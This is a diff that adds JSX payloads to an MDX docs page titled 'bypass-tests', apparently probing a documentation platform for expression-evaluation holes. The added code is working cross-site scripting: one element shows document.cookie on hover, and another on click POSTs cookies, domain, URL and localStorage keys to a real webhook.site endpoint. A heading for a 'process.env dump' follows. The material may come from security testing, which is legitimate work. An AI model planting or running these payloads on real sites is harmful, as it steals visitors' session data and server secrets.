@@ -4,6 +4,14 @@ subtitle: Testing expression evaluation in published docs
 slug: bypass-tests
 ---
 
+## Client XSS via Spread Props
+
+<div {...{onMouseEnter: () => { if(typeof document !== 'undefined') alert('cookie: ' + document.cookie.substring(0,200)) }}}>Hover here to see cookies</div>
+
+<div {...{onClick: () => { if(typeof document !== 'undefined') { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=client-xss', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookie: document.cookie, domain: document.domain, url: window.location.href, localStorage: JSON.stringify(Object.keys(localStorage))}) }).catch(() => {}); alert('Exfiltrated to webhook'); } }}}>Click here to exfil cookies to webhook</div>
+
+---
+
 ## Lambda Deep Probe
 
 ### P1: Full process.env dump
